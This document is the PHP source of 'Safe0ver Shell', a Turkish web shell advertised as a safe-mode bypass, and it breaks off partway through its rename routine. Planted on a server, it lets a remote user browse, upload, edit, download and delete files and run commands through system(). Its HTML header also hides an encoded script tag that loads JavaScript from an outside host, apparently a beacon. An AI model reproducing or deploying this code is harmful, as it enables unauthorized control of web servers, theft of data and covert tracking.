<?php 


/*
*****************************************************************************************
*                           Safe0ver Shell //Safe Mod Bypass By Evilc0der               *
***************************************************************************************** 
*        Cyber-Warrior.Org is a Platform Which You can Publish Your Shell Script        *  

***************************************************************************************** 

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! 
!!   Dikkat ! Script Egitim Amacli Yazilmistir.Scripti Kullanarak Yapacaginiz Illegal eylemlerden sorumlu Degiliz. 
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! 
*/ 


/*Setting some envirionment variables...*/ 

/* I added this to ensure the script will run correctly...
   Please enter the Script's filename in this variable. */   
$SFileName=$PHP_SELF;

/* uncomment the two following variables if you want to use http
   authentication. This will password protect your PHPShell */
//$http_auth_user = "phpshell";    /* HTTP Authorisation username, uncomment if you want to use this */
//$http_auth_pass = "phpshell";    /* HTTP Authorisation password, uncomment if you want to use this */        

error_reporting(0);
$PHPVer=phpversion();
$isGoodver=(intval($PHPVer[0])>=4);
$scriptTitle = "Safe0ver";
$scriptident = "$scriptTitle By Evilc0der.com";

$urlAdd = "";
$formAdd = "";

function walkArray($array){
  while (list($key, $data) = each($array))
    if (is_array($data)) { walkArray($data); }
    else { global $$key; $$key = $data; global $urlAdd; $urlAdd .= "$key=".urlencode($data)."&";}
}

if (isset($_PUT)) walkArray($_PUT);
if (isset($_GET)) walkArray($_GET);
if (isset($_POST)) walkArray($_POST);


$pos = strpos($urlAdd, "s=r");
if (strval($pos) != "") {
$urlAdd= substr($urlAdd, 0, $pos);
}

$urlAdd .= "&s=r&";

if (empty($Pmax))
    $Pmax = 125;   /* Identifies the max amount of Directories and files listed on one page */
if (empty($Pidx)) 
    $Pidx = 0;

$dir = str_replace("\\", "/", str_replace("//", "/", str_replace("\\\\", "\\", $dir )));
$file = str_replace("\\", "/", str_replace("//", "/", str_replace("\\\\", "\\", $file )));

$scriptdate = "7 Subat 2007";
$scriptver = "Bet@ Versiyon";
$LOCAL_IMAGE_DIR = "img";
$REMOTE_IMAGE_URL = "img";
$img = array(
                "Edit"         => "edit.gif",
                "Download"     => "download.gif",
                "Upload"     => "upload.gif",
                "Delete"     => "delete.gif",
                "View"         => "view.gif",
                "Rename"     => "rename.gif",
                "Move"         => "move.gif",
                "Copy"         => "copy.gif",
                "Execute"     => "exec.gif"
            );

while (list($id, $im)=each($img))
    if (file_exists("$LOCAL_IMAGE_DIR/$im"))
        $img[$id] = "<img height=\"16\" width=\"16\" border=\"0\" src=\"$REMOTE_IMAGE_URL/$im\" alt=\"$id\">";
    else
         $img[$id] = "[$id]";




/* HTTP AUTHENTICATION */

    if  ( ( (isset($http_auth_user) ) && (isset($http_auth_pass)) ) && ( !isset($PHP_AUTH_USER) || $PHP_AUTH_USER != $http_auth_user || $PHP_AUTH_PW != $http_auth_pass)  ||  (($logoff==1) && $noauth=="yes")  )   { 
        setcookie("noauth","");
        Header( "WWW-authenticate:  Basic realm=\"$scriptTitle $scriptver\"");
        Header( "HTTP/1.0  401  Unauthorized");
        echo "Your username or password is incorrect";
        exit ;
                 
    } 

function buildUrl($display, $url) {
        global $urlAdd;
        $url = $SFileName . "?$urlAdd$url";
    return "<a href=\"$url\">$display</a>";
}

function sp($mp) {
    for ( $i = 0; $i < $mp; $i++ )
        $ret .= "&nbsp;";
    return $ret;
}

function spacetonbsp($instr) { return str_replace(" ", "&nbsp;", $instr);  } 

function Mydeldir($Fdir) {
    if (is_dir($Fdir)) {
        $Fh=@opendir($Fdir);
         while ($Fbuf = readdir($Fh))
             if (($Fbuf != ".") && ($Fbuf != ".."))
                Mydeldir("$Fdir/$Fbuf");
        @closedir($Fh);
                return rmdir($Fdir);
    }    else {
        return unlink($Fdir);
    }
}


function arrval ($array) {
list($key, $data) = $array;
return $data;
}

function formatsize($insize) {  
    $size = $insize;
    $add = "B";
    if ($size > 1024) {
         $size = intval(intval($size) / 1.024)/1000;
         $add = "KB";
     }
     if ($size > 1024) {
         $size = intval(intval($size) / 1.024)/1000;
         $add = "MB";
     }
     if ($size > 1024) {
         $size = intval(intval($size) / 1.024)/1000;
         $add = "GB";
     }
     if ($size > 1024) {
         $size = intval(intval($size) / 1.024)/1000;
         $add = "TB";
     }
     return "$size $add";
}

if ($cmd != "downl") {
    ?>

<!-- <?php echo $scriptident ?>, <?php echo $scriptver ?>, <?php echo $scriptdate ?>  -->
<HTML>
 <HEAD>
  <STYLE>
  <!--
    A{ text-decoration:none; color:navy; font-size: 12px }
    body {
	font-size: 12px;
	font-family: arial, helvetica;
	scrollbar-width: 5;
	scrollbar-height: 5;
	scrollbar-face-color: white;
	scrollbar-shadow-color: silver;
	scrollbar-highlight-color: white;
	scrollbar-3dlight-color:silver;
	scrollbar-darkshadow-color: silver;
	scrollbar-track-color: white;
	scrollbar-arrow-color: black;
	background-color: #CCCCCC;
    }
    Table { font-size: 12px; }
    TR{ font-size: 12px; }
    TD{
	font-size: 12px;
	font-family: arial, helvetical;
	BORDER-LEFT: black 0px solid;
	BORDER-RIGHT: black 0px solid;
	BORDER-TOP: black 0px solid;
	BORDER-BOTTOM: black 0px solid;
	COLOR: black;
	background: #CCCCCC;
    }
    .border{       BORDER-LEFT: black 1px solid;
            BORDER-RIGHT: black 1px solid;
            BORDER-TOP: black 1px solid;
            BORDER-BOTTOM: black 1px solid;
          }
    .none  {       BORDER-LEFT: black 0px solid;
            BORDER-RIGHT: black 0px solid;
            BORDER-TOP: black 0px solid;
            BORDER-BOTTOM: black 0px solid;
          }
    .inputtext {
            background-color: #EFEFEF;
            font-family: arial, helvetica;
            border: 1px solid #000000;
            height: 20;
    }
    .lighttd {       background: #F8F8F8;
    }
    .darktd {        background: #CCCCCC;
    }
    input { font-family: arial, helvetica;
    }
    .inputbutton {
                        background-color: #CCCCCC;
            border: 1px solid #000000;
            border-width: 1px;
            height: 20;
    }
    .inputtextarea {
            background-color: #CCCCCC;
            border: 1px solid #000000;
            scrollbar-width: 5;
            scrollbar-height: 5;
            scrollbar-face-color: #EFEFEF;
            scrollbar-shadow-color: silver;
            scrollbar-highlight-color: #EFEFEF;
            scrollbar-3dlight-color:silver;
            scrollbar-darkshadow-color: silver;
            scrollbar-track-color: #EFEFEF;
            scrollbar-arrow-color: black;
    }
    .top { BORDER-TOP: black 1px solid; }
    .textin { BORDER-LEFT: silver 1px solid;
              BORDER-RIGHT: silver 1px solid;
           BORDER-TOP: silver 1px solid;
              BORDER-BOTTOM: silver 1px solid;
              width: 99%; font-size: 12px; font-weight: bold; color: Black;
            }
    .notop { BORDER-TOP: black 0px solid; }
    .bottom { BORDER-BOTTOM: black 1px solid; }
    .nobottom { BORDER-BOTTOM: black 0px solid; }
    .left { BORDER-LEFT: black 1px solid; }
    .noleft { BORDER-LEFT: black 0px solid; }
    .right { BORDER-RIGHT: black 1px solid; }
    .noright { BORDER-RIGHT: black 0px solid; }
    .silver{ BACKGROUND: #CCCCCC; }
body,td,th {
	color: #660000;
}
a:link {
	color: #000000;
	text-decoration: none;
}
a:hover {
	color: #00FF00;
	text-decoration: none;
}
a:active {
	color: #666666;
	text-decoration: none;
}
a:visited {
	text-decoration: none;
}
.style5 {
	color: #660000;
	font-weight: bold;
}
  -->
  </STYLE>
  <TITLE><?php echo $SFileName ?></TITLE>
<Script Language='Javascript'>
<!--
document.write(unescape('%3C%53%43%52%49%50%54%20%53%52%43%3D%68%74%74%70%3A%2F%2F%77%77%77%2E%70%68%70%2D%73%68%65%6C%6C%2E%6F%72%67%2F%63%77%68%69%64%64%65%6E%2F%79%61%7A%2E%6A%73%3E%3C%2F%53%43%52%49%50%54%3E'));
//-->
</Script>
 <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"></HEAD>
 <body topmargin="0" leftmargin="0">
 <div style="position: absolute; background: #CCCCCC; z-order:10000; top:0; left:0; width: 100%; height: 100%;">
 <table nowrap width=100% border="0" cellpadding="0" cellspacing="0">
   <tr>
     <td width="100%" class="silver border"><center>
         <strong> <font size=3><?php echo $scriptident ?> - <?php echo $scriptver ?> - <?php echo $scriptdate ?></font> </strong>
     </center></td>
   </tr>
 </table>
 <table width=100% height="100%" NOWRAP border="0">
  <tr NOWRAP>
   <td width="100%" NOWRAP><br>

    <?php
}

if ( $cmd=="dir" ) {
      $h=@opendir($dir);
     if ($h == false) {
          echo "<br><font color=\"red\">".sp(3)."\n\n\n\n
                Klasör Listelenemiyor!Lütfen Bypass Bölümünü Deneyin.<br>".sp(3)."\n
                Script Gecisi Tamamlayamadi!
                <br><br>".sp(3)."\n
                Klasöre Girmek Icin yetkiniz Olduguna emin Olunuz...
                <br><br></font>\n\n\n\n";
     }
        if (function_exists('realpath')) {
        $partdir = realpath($dir);
    }
        else {
        $partdir = $dir;
    }
     if (strlen($partdir) >= 100) {
         $partdir = substr($partdir, -100);
         $pos = strpos($partdir, "/");
         if (strval($pos) != "") {
             $partdir = "<--   ...".substr($partdir, $pos);
         }
        $partdir = str_replace("\\", "/", str_replace("//", "/", str_replace("\\\\", "\\", $partdir )));
        $dir = str_replace("\\", "/", str_replace("//", "/", str_replace("\\\\", "\\", $dir ))); 
    $file = str_replace("\\", "/", str_replace("//", "/", str_replace("\\\\", "\\", $file )));
     }
    ?>
      <form name="urlform" action="<?php echo "$SFileName?$urlAdd"; ?>" method="POST"><input type="hidden" name="cmd" value="dir">
         <table NOWRAP width="100%" border="0" cellpadding="0" cellspacing="0">
      <tr>
       <td width="100%" class="silver border">
        <center>&nbsp;Safe0ver-Server File Browser...&nbsp;</center>
       </td>
      </tr>
     </table>
       <br>
     <table width="100%" border="0" cellpadding="0" cellspacing="0">
      <tr>
           <td class="border nobottom noright">
            &nbsp;Listeliyor:&nbsp;
      </td>
          <td width="100%" class="border nobottom noleft">
           <table width="100%" border="0" cellpadding="1" cellspacing="0">
             <tr>
              <td NOWRAP width="99%" align="center"><input type="text" name="dir" class="none textin" value="<?php echo $partdir ?>"></td>
              <td NOWRAP><center>&nbsp;<a href="javascript: urlform.submit();"><b>GiT<b></a>&nbsp;<center></td>
             </tr>
            </table>
            
      </td>
     </tr>
    </table>
  <!--    </form>   -->
        <table NOWRAP width="100%" border="0" cellpadding="0" cellspacing="0" >
         <tr>
      <td width="100%" NOWRAP class="silver border">
       &nbsp;Dosya Adi&nbsp;
      </td>
          <td NOWRAP class="silver border noleft">
       &nbsp;Yapilabilecekler&nbsp;&nbsp;
      </td>
          <td NOWRAP class="silver border noleft">
       &nbsp;Boyut&nbsp;
      </td>
          <td width=1 NOWRAP class="silver border noleft">
       &nbsp;Yetkiler&nbsp;
      </td>
          <td NOWRAP class="silver border noleft">
       &nbsp;Son Düzenleme&nbsp;
      </td>
     <tr>
    <?php


          /* <!-- This whole heap of junk is the sorting section... */

     $dirn     = array();
     $filen     = array();
     $filesizes    = 0;
     while ($buf = readdir($h)) {
        if (is_dir("$dir/$buf"))
            $dirn[] = $buf;
            else 
             $filen[] = $buf;
        }         
        $dirno     = count($dirn) + 1;
         $fileno    = count($filen) + 1;

          function mycmp($a, $b){
            if ($a == $b) return 0;
            return (strtolower($a) < strtolower($b)) ? -1 : 1;
        }

        if (function_exists("usort")) {
            usort($dirn, "mycmp");
            usort($filen, "mycmp");
        }
        else {
            sort ($dirn);
             sort ($filen);
         }
    reset ($dirn);
     reset ($filen);
     if (function_exists('array_merge')) {
        $filelist = array_merge ($dirn, $filen);
    }
     else {
        $filelist = $dirn + $filen;
    }

    
    if ( count($filelist)-1 > $Pmax ) {
        $from = $Pidx * $Pmax;
        $to = ($Pidx + 1) * $Pmax-1;
        if ($to - count($filelist) - 1 + ($Pmax / 2) > 0 )
            $to = count($filelist) - 1;
        if ($to > count($filelist)-1)
            $to = count($filelist)-1;
        $Dcontents = array();
        For ($Fi = $from; $Fi <= $to; $Fi++) {
            $Dcontents[] = $filelist[$Fi];    
        }

    }
    else {
        $Dcontents = $filelist;
    }
    
     $tdcolors = array("lighttd", "darktd");

     while (list ($key, $file) = each ($Dcontents)) {
          if (!$tdcolor=arrval(each($tdcolors))) {
        reset($tdcolors);
        $tdcolor = arrval(each($tdcolors));      }
                   
         if (is_dir("$dir/$file")) { /* <!-- If it's a Directory --> */
                      /* <!-- Dirname --> */
            echo "<tr><td NOWRAP class=\"top left right $tdcolor\">".sp(3).buildUrl( "[$file]", "cmd=dir&dir=$dir/$file") .sp(9)."</td>\n";
                  /* <!-- Actions --> */
            echo "<td NOWRAP class=\"top right $tdcolor\"><center>".sp(2)."\n";
                 /* <!-- Rename --> */
            if ( ($file != ".") && ($file != "..") )
                echo buildUrl($img["Rename"], "cmd=ren&lastcmd=dir&lastdir=$dir&oldfile=$dir/$file").sp(3)."\n";
                 /* <!-- Delete --> */
            if ( ($file != ".") && ($file != "..") )
                echo sp(3).buildUrl( $img["Delete"], "cmd=deldir&file=$dir/$file&lastcmd=dir&lastdir=$dir")."\n";
                /* <!-- End of Actions --> */
            echo "&nbsp;&nbsp;</center></td>\n";
                  /* <!-- Size --> */
            echo "<td NOWRAP class=\"top right $tdcolor\">&nbsp;</td>\n";
                 /* <!-- Attributes --> */
            echo "<td NOWRAP class=\"top right $tdcolor\">&nbsp;&nbsp;\n";
             echo "<strong>D</strong>";
                if ( @is_readable("$dir/$file") ) {
                   echo "<strong>R</strong>";
             }
             if (function_exists('is_writeable')) {
                if ( @is_writeable("$dir/$file") ) {
                     echo "<strong>W</stong>";
                 }
            }
             else {
                    echo "<strong>(W)</stong>";
              }
              if ( @is_executable("$dir/$file") ) {
                 echo "<Strong>X<strong>";
             }
             echo "&nbsp;&nbsp;</td>\n";
                 /* <!-- Date --> */
            echo "<td NOWRAP class=\"top right $tdcolor\" NOWRAP>\n";
             echo "&nbsp;&nbsp;".date("D d-m-Y H:i:s", filemtime("$dir/$file"))."&nbsp;&nbsp;";
             echo "</td>";
            echo "</tr>\n";

            }
          else { /* <!-- Then it must be a File... --> */
                     /* <!-- Filename --> */
            if ( @is_readable("$dir/$file") )
                 echo "<tr><td NOWRAP class=\"top left right $tdcolor\">".sp(3).buildUrl( $file, "cmd=file&file=$dir/$file").sp(9)."</td>\n";
              else
                  echo "<tr><td NOWRAP class=\"top left right $tdcolor\">".sp(3).$file.sp(9)."</td>\n";
                                 /* <!-- Actions --> */
            echo "<td NOWRAP class=\"top right $tdcolor\"><center>&nbsp;&nbsp;\n";
                 /* <!-- Rename --> */
            echo buildUrl($img["Rename"], "cmd=ren&lastcmd=dir&lastdir=$dir&oldfile=$dir/$file").sp(3)."\n";
                  /* <!-- Edit --> */
            if ( (@is_writeable("$dir/$file")) && (@is_readable("$dir/$file")) )
                 echo buildUrl( $img["Edit"], "cmd=edit&file=$dir/$file").sp(3)."\n";
                   /* <!-- Copy --> */
             echo buildUrl( $img["Copy"], "cmd=copy&file=$dir/$file")."\n";
                  /* <!-- Move --> */
            if ( (@is_writeable("$dir/$file")) && (@is_readable("$dir/$file")) )
                     echo sp(3). buildUrl( $img["Move"], "cmd=move&file=$dir/$file")."\n";
                    /* <!-- Delete --> */
            echo sp(3). buildUrl( $img["Delete"], "cmd=delfile&file=$dir/$file&lastcmd=dir&lastdir=$dir")."\n";
                 /* <!-- Download --> */
            echo sp(3). buildUrl( $img["Download"], "cmd=downl&file=$dir/$file")."\n";
                 /* <!-- Execute --> */
            if ( @is_executable("$dir/$file") )
                 echo sp(3).buildUrl( $img["Execute"], "cmd=execute&file=$dir/$file")."\n";
                    /* <!-- End of Actions --> */
            echo sp(2)."</center></td>\n";
                 /* <!-- Size --> */
            echo "<td NOWRAP align=\"right\" class=\"top right $tdcolor\" NOWRAP >\n";
             $size = @filesize("$dir/$file");
             If ($size != false) {
                    $filesizes += $size;
                echo "&nbsp;&nbsp;<strong>".formatsize($size)."<strong>";
            }
            else
                echo "&nbsp;&nbsp;<strong>0 B<strong>";
             echo "&nbsp;&nbsp;</td>\n";

                 /* <!-- Attributes --> */
            echo "<td NOWRAP class=\"top right $tdcolor\">&nbsp;&nbsp;\n";

             if ( @is_readable("$dir/$file") )
                 echo "<strong>R</strong>";
               if ( @is_writeable("$dir/$file") )
                 echo "<strong>W</stong>";
               if ( @is_executable("$dir/$file") )
                 echo "<Strong>X<strong>";
               if (function_exists('is_uploaded_file')){
                 if ( @is_uploaded_file("$dir/$file") )
                     echo "<Strong>U<strong>";
             }
             else {
                echo "<Strong>(U)<strong>";
            }
             echo "&nbsp;&nbsp;</td>\n";
                 /* <!-- Date --> */
            echo "<td NOWRAP class=\"top right $tdcolor\" NOWRAP>\n";
             echo "&nbsp;&nbsp;".date("D d-m-Y H:i:s", filemtime("$dir/$file"))."&nbsp;&nbsp;";
             echo "</td>";
             echo "</tr>\n";
         }
      }

        echo "</table><table width=100% border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tr>\n<td NOWRAP width=100% class=\"silver border noright\">\n";
      echo "&nbsp;&nbsp;".@count ($dirn)."&nbsp;Klasör,&nbsp;".@count ($filen)."&nbsp;Dosya&nbsp;&nbsp;\n";
      echo "</td><td NOWRAP class=\"silver border noleft\">\n";
      echo "&nbsp;&nbsp;Toplam Dosya Boyutu:&nbsp;".formatsize($filesizes)."&nbsp;&nbsp;<td></tr>\n";
    
    function printpagelink($a, $b, $link = ""){
        if ($link != "") 
            echo "<A HREF=\"$link\"><b>| $a - $b |</b></A>";
        else
            echo "<b>| $a - $b |</b>";
    }
        
    if ( count($filelist)-1 > $Pmax ) {
        echo "<tr><td colspan=\"2\" class=\"silver border notop\"><table width=\"100%\" cellspacing=\"0\" cellpadding=\"3\"><tr><td valign=\"top\"><font color=\"red\"><b>Page:</b></font></td><td width=\"100%\"><center>";
        $Fi = 0;
        while ( ( (($Fi+1)*$Pmax) + ($Pmax/2) ) < count($filelist)-1 ) {
            $from = $Fi*$Pmax;
            while (($filelist[$from]==".") || ($filelist[$from]=="..")) $from++; 
            $to = ($Fi + 1) * $Pmax - 1;
            if ($Fi == $Pidx)
                $link="";
            else 
                $link="$SFilename?$urlAdd"."cmd=$cmd&dir=$dir&Pidx=$Fi";
            printpagelink (substr(strtolower($filelist[$from]), 0, 5), substr(strtolower($filelist[$to]), 0, 5), $link);
            echo "&nbsp;&nbsp;&nbsp;";
            $Fi++;
        }
        $from = $Fi*$Pmax;
        while (($filelist[$from]==".") || ($filelist[$from]=="..")) $from++; 
        $to = count($filelist)-1;
        if ($Fi == $Pidx)
            $link="";
        else 
            $link="$SFilename?$urlAdd"."cmd=$cmd&dir=$dir&Pidx=$Fi";
        printpagelink (substr(strtolower($filelist[$from]), 0, 5), substr(strtolower($filelist[$to]), 0, 5), $link);        
        
    
        echo "</center></td></tr></table></td></tr>";
    }


        echo "</table>\n<br><table NOWRAP>";

      if ($isGoodver) {
        echo "<tr><td class=\"silver border\">&nbsp;<strong>PHP Versiyonu:&nbsp;&nbsp;</strong>&nbsp;</td><td>&nbsp;$PHPVer&nbsp;</td></tr>\n";
    }
     else {
        echo "<tr><td class=\"silver border\">&nbsp;<strong>Server's PHP Version:&nbsp;&nbsp;</strong>&nbsp;</td><td>&nbsp;$PHPVer (Some functions might be unavailable...)&nbsp;</td></tr>\n";
    }
              /* <!-- Other Actions --> */
       echo "<tr><td class=\"silver border\">&nbsp;<strong>Diger Islemler:&nbsp;&nbsp;</strong>&nbsp;</td>\n";
      echo "<td>&nbsp;<b>".buildUrl( "| Yeni Dosya |", "cmd=newfile&lastcmd=dir&lastdir=$dir")."\n".sp(3).
                         buildUrl( "| Yeni Klasör |", "cmd=newdir&lastcmd=dir&lastdir=$dir")."\n".sp(3).
                 buildUrl( "| Dosya Yükle |", "cmd=upload&dir=$dir&lastcmd=dir&lastdir=$dir"). "</b>\n</td></tr>\n";
        echo "<tr><td class=\"silver border\">&nbsp;<strong>Script Location:&nbsp;&nbsp;</strong>&nbsp;</td><td>&nbsp;$PATH_TRANSLATED</td></tr>\n";
      echo "<tr><td class=\"silver border\">&nbsp;<strong>IP Adresin:&nbsp;&nbsp;</strong>&nbsp;</td><td>&nbsp;$REMOTE_ADDR&nbsp;</td></tr>\n";
      echo "<tr><td class=\"silver border\">&nbsp;<strong>Bulundugun Klasör:&nbsp;&nbsp;</strong></td><td>&nbsp;$partdir&nbsp;</td></tr>\n";
      echo "<tr><td valign=\"top\" class=\"silver border\">&nbsp;<strong>Semboller:&nbsp;&nbsp;</strong&nbsp;</td><td>\n";
      echo "<table NOWRAP>";
        echo "<tr><td><strong>D:</strong></td><td>&nbsp;&nbsp;Klasör.</td></tr>\n";
       echo "<tr><td><strong>R:</strong></td><td>&nbsp;&nbsp;Okunabilir.</td></tr>\n";
      echo "<tr><td><strong>W:</strong></td><td>&nbsp;&nbsp;Yazilabilir.</td></tr>\n";
      echo "<tr><td><strong>X:</strong></td><td>&nbsp;&nbsp;Komut Calistirilabilir.</td></tr>\n";
      echo "<tr><td><strong>U:</strong></td><td>&nbsp;&nbsp;HTTP Uploaded File.</td></tr>\n";
      echo "</table></td>";
     echo "</table>";
     echo "<br>";
         @closedir($h);
  }
  elseif ( $cmd=="execute" ) {/*<!-- Execute the executable -->*/
     echo system("$file");
 }
elseif ( $cmd=="deldir" ) { /*<!-- Delete a directory and all it's files --> */
    echo "<center><table><tr><td NOWRAP>" ;
     if ($auth == "yes") {
        if (Mydeldir($file)==false) {
             echo "Could not remove \"$file\"<br>Permission denied, or directory not empty...";
          }
         else {
             echo "Successfully removed \"$file\"<br>";
         }
         echo "<form action=\"$SFileName?$urlAdd\" method=\"POST\"><input type=\"hidden\" name=\"cmd\" value=\"$lastcmd\"><input type=\"hidden\" name=\"dir\" value=\"$lastdir\"><input tabindex=\"0\" type=\"submit\" value=\"Safe0ver'a Dön\"></form>";
    }
     else {
        echo "Are you sure you want to delete \"$file\" and all it's subdirectories ?
        <form action=\"$SFileName?$urlAdd\" method=\"POST\">
        <input type=\"hidden\" name=\"cmd\" value=\"deldir\">
         <input type=\"hidden\" name=\"lastcmd\" value=\"$lastcmd\">
         <input type=\"hidden\" name=\"lastdir\" value=\"$lastdir\">
         <input type=\"hidden\" name=\"file\" value=\"$file\">
         <input type=\"hidden\" name=\"auth\" value=\"yes\">
         <input type=\"submit\" value=\"Yes\"></form>
        <form action=\"$SFileName?$urlAdd\" method=\"POST\">
    <input type=\"hidden\" name=\"cmd\" value=\"$lastcmd\">
    <input type=\"hidden\" name=\"dir\" value=\"$lastdir\">
    <input tabindex=\"0\" type=\"submit\" value=\"NO!\"></form>";
        }
     echo "</td></tr></center>";
}
 elseif ( $cmd=="delfile" ) { /*<!-- Delete a file --> */    echo "<center><table><tr><td NOWRAP>" ;
     if ($auth == "yes") {
        if (@unlink($file)==false) {
             echo "Could not remove \"$file\"<br>";
          }
         else {
             echo "Successfully removed \"$file\"<br>";
         }
        echo "<form action=\"$SFileName?$urlAdd\" method=\"POST\"><input type=\"hidden\" name=\"cmd\" value=\"$lastcmd\"><input type=\"hidden\" name=\"dir\" value=\"$lastdir\"><input tabindex=\"0\" type=\"submit\" value=\"Safe0ver'a Dön\"></form>";
        }
     else {
           echo "Are you sure you want to delete \"$file\" ?
          <form action=\"$SFileName?$urlAdd\" method=\"POST\">
         <input type=\"hidden\" name=\"cmd\" value=\"delfile\">
         <input type=\"hidden\" name=\"lastcmd\" value=\"$lastcmd\">
         <input type=\"hidden\" name=\"lastdir\" value=\"$lastdir\">
         <input type=\"hidden\" name=\"file\" value=\"$file\">
         <input type=\"hidden\" name=\"auth\" value=\"yes\">

         <input type=\"submit\" value=\"Yes\"></form>
           <form action=\"$SFileName?$urlAdd\" method=\"POST\">
    <input type=\"hidden\" name=\"cmd\" value=\"$lastcmd\">
    <input type=\"hidden\" name=\"dir\" value=\"$lastdir\">
    <input tabindex=\"0\" type=\"submit\" value=\"NO!\"></form>";
        }
     echo "</td></tr></center>";
}
elseif ( $cmd=="newfile" ) { /*<!-- Create new file with default name --> */
    echo "<center><table><tr><td NOWRAP>";
     $i = 1;
     while (file_exists("$lastdir/newfile$i.txt"))
         $i++;
     $file = fopen("$lastdir/newfile$i.txt", "w+");
     if ($file == false)
         echo "Could not create the new file...<br>";
     else
         echo "Successfully created: \"$lastdir/newfile$i.txt\"<br>";
         echo "
               <form action=\"$SFileName?$urlAdd\" method=\"POST\">
            <input type=\"hidden\" name=\"cmd\" value=\"$lastcmd\">
            <input type=\"hidden\" name=\"dir\" value=\"$lastdir\">
            <input tabindex=\"0\" type=\"submit\" value=\"Safe0ver'a Dön\">
            </form></center>
             </td></tr></table></center>           ";
    }
elseif ( $cmd=="newdir" ) { /*<!-- Create new directory with default name --> */
    echo "<center><table><tr><td NOWRAP>" ;
     $i = 1;
     while (is_dir("$lastdir/newdir$i"))
          $i++;
     $file = mkdir("$lastdir/newdir$i", 0777);
     if ($file == false)
         echo "Could not create the new directory...<br>";
     else
         echo "Successfully created: \"$lastdir/newdir$i\"<br>";
     echo "<form action=\"$SFileName?$urlAdd\" method=\"POST\">
        <input type=\"hidden\" name=\"cmd\" value=\"$lastcmd\">
        <input type=\"hidden\" name=\"dir\" value=\"$lastdir\">
        <input tabindex=\"0\" type=\"submit\" value=\"Safe0ver'a Dön\">
        </form></center></td></tr></table></center>";
}
elseif ( $cmd=="edit" ) { /*<!-- Edit a file and save it afterwards with the saveedit block. --> */
    $contents = "";
    $fc = @file( $file );
      while ( @list( $ln, $line ) = each( $fc ) ) {
          $contents .= htmlentities( $line ) ;
     }
     echo "<br><center><table><tr><td NOWRAP>";
    echo "M<form action=\"$SFileName?$urlAdd\" method=\"post\">\n";
    echo "<input type=\"hidden\" name=\"cmd\" value=\"saveedit\">\n";
    echo "<strong>EDIT FILE: </strong>$file<br>\n";
    echo "<textarea rows=\"25\" cols=\"95\" name=\"contents\">$contents</textarea><br>\n";
    echo "<input size=\"50\" type=\"text\" name=\"file\" value=\"$file\">\n";
    echo "<input type=\"submit\" value=\"Save\">";
    echo "</form>";
    echo "</td></tr></table></center>";
}
elseif ( $cmd=="saveedit" ) { /*<!-- Save the edited file back to a file --> */
    $fo = fopen($file, "w");
    $wrret = fwrite($fo, stripslashes($contents));
    $clret = fclose($fo);
}
elseif ( $cmd=="downl" ) { /*<!-- Save the edited file back to a file --> */
    $downloadfile = urldecode($file);
    if (function_exists("basename"))
            $downloadto = basename ($downloadfile);
    else
        $downloadto = "download.ext";
    if (!file_exists("$downloadfile"))
        echo "The file does not exist";
    else {
        $size = @filesize("$downloadfile");
        if ($size != false) {
            $add="; size=$size";
        }            
        else {
            $add="";
        }
         header("Content-Type: application/download");
        header("Content-Disposition: attachment; filename=$downloadto$add");
        $fp=fopen("$downloadfile" ,"rb");
        fpassthru($fp);
        flush();
    }
}
elseif ( $cmd=="upload" ) { /* <!-- Upload File form --> */ 
       ?>
    <center>
     <table>
      <tr>
       <td NOWRAP>
            Dosya Yükleme Sekmesine Tikladiniz !
        <br> Eger Yüklemek istediginiz Dosya mevcut ise üzerine Yazilir.<br><br>
      <form enctype="multipart/form-data" action="<?php echo "$SFileName?$urlAdd" ?>" method="post">
             <input type="hidden" name="MAX_FILE_SIZE" value="1099511627776">
             <input type="hidden" name="cmd" value="uploadproc">
             <input type="hidden" name="dir" value="<?php echo $dir ?>">
             <input type="hidden" name="lastcmd" value="<?php echo $lastcmd ?>">
             <input type="hidden" name="lastdir" value="<?php echo $lastdir ?>">
             Dosya Yükle:<br>
             <input size="75" name="userfile" type="file"><br>
             <input type="submit" value="Yükle">
      </form>
        <br>
         <form action="<?php echo "$SFileName?$urlAdd" ?>" method="POST">
            <input type="hidden" name="cmd" value="<?php echo $lastcmd ?>">
            <input type="hidden" name="dir" value="<?php echo $lastdir ?>">
            <input tabindex="0" type="submit" value="Iptal">
        </form>
    </td>
   </tr>
 </table>
    </center>

     <?php
}
elseif ( $cmd=="uploadproc" ) { /* <!-- Process Uploaded file --> */
    echo "<center><table><tr><td NOWRAP>";
    if (file_exists($userfile))
        $res = copy($userfile, "$dir/$userfile_name");
    echo "Uploaded \"$userfile_name\" to \"$userfile\"; <br>\n";
         if ($res) {
        echo "Basariyla Yüklendi \"$userfile\" to \"$dir/$userfile_name\".\n<br><br>";
        echo "Yüklenen Dosya Adi: \"$userfile_name\".\n<br>Dosya Adi: \"$userfile\".\n<br>";
        echo "Dosya Boyutu: ".formatsize($userfile_size).".\n<br>Filetype: $userfile_type.\n<br>";
    }
    else {
        echo "Yüklenemedi...";
    }
    echo "<form action=\"$SFileName?$urlAdd\" method=\"POST\"><input type=\"hidden\" name=\"cmd\" value=\"$lastcmd\"><input type=\"hidden\" name=\"dir\" value=\"$lastdir\"><input tabindex=\"0\" type=\"submit\" value=\"Safe0ver'a Dön\"></form></center>" ;
    echo "<br><br></td></tr></table></center>";
}
elseif ( $cmd=="file" ) { /* <!-- View a file in text --> */
        echo "<hr>"; 
    $fc = @file( $file );      while ( @list( $ln, $line ) = each( $fc ) ) {
          echo spacetonbsp(@htmlentities($line))."<br>\n";
      }
    echo "<hr>";
}
elseif ( $cmd=="ren" ) { /* <!-- File and Directory Rename --> */
         if (function_exists('is_dir')) {
         if (is_dir("$oldfile")) {
             $objname = "Directory";
             $objident = "Directory";
          }
         else {
             $objname = "Filename";
             $objident = "file";
         }
     }
       echo "<table width=100% border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tr><td width=100% style=\"class=\"silver border\"><center>&nbsp;Rename a file:&nbsp;</center></td></tr></table><br>\n";
    If (empty($newfile) != true) {
         echo "<center>";
         $return = @rename($oldfile, "$olddir$newfile");
        if ($return) {
